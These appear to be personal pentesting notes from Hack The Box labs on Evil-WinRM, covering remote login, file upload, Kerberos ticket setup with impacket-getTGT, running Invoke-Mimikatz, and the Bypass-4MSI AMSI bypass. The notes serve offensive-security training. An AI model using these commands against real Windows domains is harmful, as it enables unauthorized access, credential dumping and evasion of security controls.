![[../assets/Evil-WinRM/Untitled 20.png|Untitled 20.png]]
“evil-winrm -i 10.10.10.10 -u user -p password”
  
can upload files with “upload”
- it will take the file path you spawned the shell with (i.e. starting in /home/kali means that it will check that when uploading
- the example above (/opt/winPEAS…) works because i spawned the shell in the root directory
    
    - if i did it in /home/kali, it wouldn’t find winPEAS
    
  
Can get mimikatz to work on evil-winrm using these commands
![[../assets/Evil-WinRM/image 240.png|image 240.png]]
- if this doesn’t work, you can pass in the mimikatz script folder instead
    
    - /opt/privesc/PowerShell/Invoke-Mimikatz
    
  
sometimes you may need to add some info to /etc/krb5.conf in order to login
- this happens when trying to log in with a kerberos ticket, since the KDC (Key Distribution Center) doesn’t know who you are
    
    - sudo vim /etc/krb5.conf (add the following info)
    
    - dc.<domain> could also be dc01.domain — depends on the machine
    
    - make sure the spacing is correct or else it won’t work
        
        - align everything to the left fully then use tab to align as follows
        
    
```C
[libdefaults]
    default_realm = <domain>
[realms]
    VOLEUR.HTB = {
        kdc = dc.<domain>
        admin_server = dc.<domain>
```
![[../assets/Evil-WinRM/image 1 174.png|image 1 174.png]]
  
now you need to get the TGT for the user you want to authenticate as
- impacket-getTGT <DOMAIN/user>:<pass> -dc-ip dc01.infiltrator.htb
![[../assets/Evil-WinRM/image 2 150.png|image 2 150.png]]
- you may need to export the ccache file created into KRB5CCNAME (i don’t think this is required)
    
    - export KRB5CCNAME=<ccache_file_name> (shown from the above output)
    
![[../assets/Evil-WinRM/image 3 133.png|image 3 133.png]]
  
- now login to evil-winrm with the newly created ticket ccache file
![[../assets/Evil-WinRM/image 4 116.png|image 4 116.png]]
- KRB5CCNAME=<user_ccache> evil-winrm -i <dc01.domain> -u <user> -r <DOMAIN>
  
use -s flag to use evil-winrm with script capability
- i.e. Invoke-Mimikatz.ps1
- evil-winrm -u <user> -p <pass> -i <ip> -s <path_to_scripts>
- Bypass-4MSI (NEEDED)  
    Invoke-Mimikatz.ps1  
    Invoke-Mimikatz